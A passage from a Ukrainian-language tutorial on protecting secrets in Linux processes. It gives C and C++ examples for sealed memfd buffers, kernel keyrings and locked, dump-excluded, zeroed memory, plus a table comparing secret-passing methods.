        constexpr int seals = F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL;
        if (::fcntl(fd, F_ADD_SEALS, seals) < 0) {
            ::close(fd);
            return std::nullopt;
        }

        ::lseek(fd, 0, SEEK_SET);
        return SealedSecretBuffer(fd);
    }
};
```
:::

Дескриптор `memfd` може бути переданий будь-якому іншому локальному процесу через сокет домену Unix (Unix Domain Socket) за допомогою керуючого повідомлення `SCM_RIGHTS`. Процес-отримувач отримує доступ до незмінного буфера в оперативній пам'яті без створення записів у файловій системі.

### Модель 4: Зв'язки ключів ядра Linux (Kernel Keyrings)

Найбільш захищеним системним сховищем секретів у Linux є підсистема зв'язок ключів ядра (Linux Kernel Keyrings, системні виклики `add_key()`, `request_key()`, `keyctl()`).

Ключі та секрети зберігаються у внутрішній захищеній пам'яті ядра, недосяжній для читання через `/proc/$PID/mem`, `/proc/$PID/environ` або coredump файли.

Ядро організовує ключі в ієрархічні зв'язки (Keyrings):
- **Thread Keyring (`KEY_SPEC_THREAD_KEYRING`)**: Прив'язана до конкретного потоку виконання;
- **Process Keyring (`KEY_SPEC_PROCESS_KEYRING`)**: Спільна для всіх потоків процесу, знищується при `execve()` (якщо не налаштовано збереження);
- **Session Keyring (`KEY_SPEC_SESSION_KEYRING`)**: Прив'язана до поточної сесії входу користувача;
- **User Keyring (`KEY_SPEC_USER_KEYRING`)**: Постійна зв'язка для конкретного `UID`.

Кожен ключ має бітову маску дозволів POSIX (View, Read, Write, Search, Link, Setattr) окремо для власника, групи та інших користувачів, а також таймер самознищення (Time-To-Live, TTL).

Робота з ключами через системні виклики ядра:

:::tabs
```c
/* Додавання та читання секрету з Process Keyring мовою C */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>

/* Обертки для системних викликів керування ключами */
static inline key_serial_t sys_add_key(const char *type, const char *description,
                                       const void *payload, size_t plen,
                                       key_serial_t ringid) {
    return (key_serial_t)syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long sys_keyctl(int operation, unsigned long arg2, unsigned long arg3,
                              unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

int main(void) {
    const char secret_value[] = "MasterKey_Crypto_2026";
    
    /* Зберігаємо секрет у зв'язці процесу (Process Keyring) */
    key_serial_t key = sys_add_key("user", "db_master_pass",
                                   secret_value, sizeof(secret_value),
                                   KEY_SPEC_PROCESS_KEYRING);
    if (key < 0) {
        perror("add_key");
        return EXIT_FAILURE;
    }
    printf("Ключ збережено в ядрі з дескриптором ID: %d\n", key);

    /* Встановлюємо таймаут життя ключа: 300 секунд (5 хвилин) */
    if (sys_keyctl(KEYCTL_SET_TIMEOUT, key, 300, 0, 0) < 0) {
        perror("keyctl SET_TIMEOUT");
    }

    /* Читання секрету з ядра */
    char buffer[128];
    long len = sys_keyctl(KEYCTL_READ, key, (unsigned long)buffer, sizeof(buffer), 0);
    if (len > 0) {
        printf("Зчитано секрет із ядра: %.*s\n", (int)len, buffer);
        /* Безпечне занулення буфера користувача */
        explicit_bzero(buffer, sizeof(buffer));
    }

    return EXIT_SUCCESS;
}
```
```cpp
// Ідіоматична обгортка для Linux Kernel Keyring у C++
#define _GNU_SOURCE
#include <iostream>
#include <string_view>
#include <vector>
#include <optional>
#include <system_error>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>

class KernelKeyringSecret {
    int32_t key_id_{-1};
public:
    explicit KernelKeyringSecret(int32_t key_id) noexcept : key_id_(key_id) {}
    ~KernelKeyringSecret() {
        if (key_id_ > 0) {
            // Відкликаємо ключ при знищенні об'єкта
            ::syscall(__NR_keyctl, KEYCTL_REVOKE, key_id_, 0, 0, 0);
        }
    }

    KernelKeyringSecret(const KernelKeyringSecret&) = delete;
    KernelKeyringSecret& operator=(const KernelKeyringSecret&) = delete;

    KernelKeyringSecret(KernelKeyringSecret&& o) noexcept : key_id_(o.key_id_) {
        o.key_id_ = -1;
    }
    KernelKeyringSecret& operator=(KernelKeyringSecret&& o) noexcept {
        if (this != &o) {
            if (key_id_ > 0) ::syscall(__NR_keyctl, KEYCTL_REVOKE, key_id_, 0, 0, 0);
            key_id_ = o.key_id_;
            o.key_id_ = -1;
        }
        return *this;
    }

    [[nodiscard]] int32_t id() const noexcept { return key_id_; }

    static std::optional<KernelKeyringSecret> store(std::string_view name, std::string_view payload, unsigned int timeout_sec = 300) noexcept {
        auto res = ::syscall(__NR_add_key, "user", name.data(), payload.data(), payload.size(), KEY_SPEC_PROCESS_KEYRING);
        if (res < 0) return std::nullopt;

        const auto key_id = static_cast<int32_t>(res);
        if (timeout_sec > 0) {
            ::syscall(__NR_keyctl, KEYCTL_SET_TIMEOUT, key_id, timeout_sec, 0, 0);
        }
        return KernelKeyringSecret(key_id);
    }

    [[nodiscard]] std::optional<std::vector<char>> read() const noexcept {
        if (key_id_ <= 0) return std::nullopt;

        auto len = ::syscall(__NR_keyctl, KEYCTL_READ, key_id_, nullptr, 0, 0);
        if (len <= 0) return std::nullopt;

        std::vector<char> buffer(static_cast<std::size_t>(len));
        auto read_len = ::syscall(__NR_keyctl, KEYCTL_READ, key_id_, buffer.data(), buffer.size(), 0);
        if (read_len != len) return std::nullopt;

        return buffer;
    }
};

int main() {
    auto secret = KernelKeyringSecret::store("jwt_signing_key", "SuperSecretPayload2026", 600);
    if (!secret) {
        std::cerr << "Не вдалося зберегти ключ у Kernel Keyring\n";
        return EXIT_FAILURE;
    }

    std::cout << "Ключ успішно зареєстровано в ядрі, Key ID: " << secret->id() << '\n';

    auto retrieved = secret->read();
    if (retrieved) {
        std::cout << "Успішно зчитано ключ довжиною " << retrieved->size() << " байтів\n";
        // Занулення пам'яті після використання
        ::explicit_bzero(retrieved->data(), retrieved->size());
    }

    return EXIT_SUCCESS;
}
```
:::

## 6. Безпечне поводження з секретами в пам'яті процесу

Яку б модель отримання секрету не обрав застосунок (пайп, файл на `tmpfs` чи Kernel Keyring), у мить обробки секрет неминуче опиняється у віртуальному адресному просторі процесу користувача.

Для запобігання вторинним витокам через підсистеми ядра необхідно застосовувати три обов'язкові заходи захисту пам'яті:

1. **Блокування сторінок пам'яті від вивантаження у swap (`mlock` / `mlockall`)**: Запобігає запису оперативної пам'яті на диск при браку пам'яті;
2. **Виключення пам'яті з аварійних дампів (`madvise` з прапорцем `MADV_DONTDUMP`)**: Повідомляє ядру, що вказаний діапазон адрес не повинен включатися у файл coredump при аварійному завершенні;
3. **Гарантоване занулення буферів пам'яті (`explicit_bzero` або `sodium_memzero`)**: Звичайний виклик `memset(ptr, 0, len)` часто оптимізується компілятором (Dead Store Elimination), якщо після нього змінна не використовується. Функція `explicit_bzero()` гарантує, що компілятор виконає фізичне занулення байтів.

Нижче наведено повний зразок захищеного буфера пам'яті для зберігання секретів у просторі користувача:

:::tabs
```c
/* Захищений буфер для роботи з секретами в оперативній пам'яті мовою C */
#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

typedef struct {
    void *data;
    size_t size;
} SecureBuffer;

SecureBuffer* secure_buffer_alloc(size_t size) {
    long page_size = sysconf(_SC_PAGESIZE);
    size_t aligned_size = (size + (size_t)page_size - 1) & ~((size_t)page_size - 1);

    void *ptr = mmap(NULL, aligned_size, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }

    /* 1. Блокуємо сторінку від вивантаження у swap */
    if (mlock(ptr, aligned_size) < 0) {
        perror("mlock");
    }

    /* 2. Забороняємо включення сторінки у coredump */
    if (madvise(ptr, aligned_size, MADV_DONTDUMP) < 0) {
        perror("madvise MADV_DONTDUMP");
    }

    SecureBuffer *buf = malloc(sizeof(SecureBuffer));
    if (!buf) {
        munlock(ptr, aligned_size);
        munmap(ptr, aligned_size);
        return NULL;
    }
    buf->data = ptr;
    buf->size = aligned_size;
    return buf;
}

void secure_buffer_free(SecureBuffer *buf) {
    if (!buf) return;
    if (buf->data) {
        /* 3. Гарантоване занулення перед звільненням */
        explicit_bzero(buf->data, buf->size);
        munlock(buf->data, buf->size);
        munmap(buf->data, buf->size);
    }
    free(buf);
}
```
```cpp
// Захищений RAII-буфер пам'яті для секретів мовою C++
#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <cstring>
#include <span>
#include <memory>
#include <iostream>
#include <stdexcept>

class SecureMemory {
    void* ptr_{nullptr};
    std::size_t size_{0};

    static std::size_t align_to_page(std::size_t req_size) noexcept {
        const auto page_sz = static_cast<std::size_t>(::sysconf(_SC_PAGESIZE));
        return (req_size + page_sz - 1) & ~(page_sz - 1);
    }
public:
    explicit SecureMemory(std::size_t size) : size_(align_to_page(size)) {
        ptr_ = ::mmap(nullptr, size_, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (ptr_ == MAP_FAILED) {
            throw std::runtime_error("mmap failed");
        }

        // 1. Блокування сторінки від вивантаження у swap
        ::mlock(ptr_, size_);

        // 2. Виключення пам'яті з coredump дампів
        ::madvise(ptr_, size_, MADV_DONTDUMP);
    }

    ~SecureMemory() {
        if (ptr_ && ptr_ != MAP_FAILED) {
            // 3. Гарантоване занулення байтів у пам'яті
            ::explicit_bzero(ptr_, size_);
            ::munlock(ptr_, size_);
            ::munmap(ptr_, size_);
        }
    }

    SecureMemory(const SecureMemory&) = delete;
    SecureMemory& operator=(const SecureMemory&) = delete;

    SecureMemory(SecureMemory&& other) noexcept : ptr_(other.ptr_), size_(other.size_) {
        other.ptr_ = nullptr;
        other.size_ = 0;
    }

    SecureMemory& operator=(SecureMemory&& other) noexcept {
        if (this != &other) {
            this->~SecureMemory();
            ptr_ = other.ptr_;
            size_ = other.size_;
            other.ptr_ = nullptr;
            other.size_ = 0;
        }
        return *this;
    }

    [[nodiscard]] std::span<std::byte> bytes() noexcept {
        return {static_cast<std::byte*>(ptr_), size_};
    }
};
```
:::

## 7. Порівняльна характеристика моделей зберігання секретів

У таблиці нижче зіставлено фундаментальні властивості розглянутих механізмів передачі та зберігання секретів.

| Критерій оцінки | Змінні середовища (`environ`) | Анонімні пайпи / FD (`pipe2`) | Файли `tmpfs` / Credentials | Дескриптори `memfd_create` | Linux Kernel Keyrings |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Стійкість до читання через `/proc`** | ❌ Немає (доступно тому ж UID) | ✅ Висока (немає у `/proc/$PID/environ`) | ✅ Висока (захищено правами `0600`) | ✅ Висока (анонімний дескриптор) | ✅ Абсолютна (зберігається в ядрі) |
| **Стійкість до аварійного coredump** | ❌ Немає (скидається початковий стек) | ⚠️ Потрібен `MADV_DONTDUMP` для буфера | ⚠️ Потрібен `MADV_DONTDUMP` для буфера | ⚠️ Потрібен `MADV_DONTDUMP` для буфера | ✅ Абсолютна (відсутній у користувацькій пам'яті) |
| **Успадкування при `fork()` / `execve()`** | ❌ Автоматичне передавання всім нащадкам | ✅ Повний контроль через `O_CLOEXEC` | ✅ Ізоляція правами доступу та namespaces | ✅ Передається лише через сокет/FD | ✅ Кероване (налаштування Keyring) |
| **Стійкість до витоку в APM / логи** | ❌ Вкрай низька (дампиться за замовчуванням) | ✅ Висока (потрібне пряме читання FD) | ✅ Висока (не потрапляє у глобальні змінні) | ✅ Висока (ізольований буфер) | ✅ Висока (доступ лише через syscall) |
| **Підтримка автознищення за часом (TTL)**| ❌ Відсутня | ❌ Відсутня | ❌ Потрібен зовнішній демон | ❌ Відсутня | ✅ Вбудована в ядро (`SET_TIMEOUT`) |
| **Складність інтеграції в ПЗ** | 🟢 Мінімальна (наявна скрізь) | 🟡 Середня (обробка дескрипторів) | 🟢 Низька (читання звичайного файлу) | 🔴 Висока (робота з `SCM_RIGHTS`) | 🟡 Середня (системні виклики `keyctl`) |

> 🔧 **Навіщо це.**
> Змінні середовища залишаються зручним стандартом для загальної конфігурації платформи, але їх використання для збереження паролів, токенів API та приватних ключів порушує базові принципи ешелонованого захисту Unix. Перехід на використання передачі секретів через виділені файлові дескриптори, захищені точки монтування `tmpfs` у контейнерах або підсистему Kernel Keyrings повністю ліквідує вектори витоку через `/proc`, журналювання помилок та неконтрольоване успадкування дочірніми процесами.
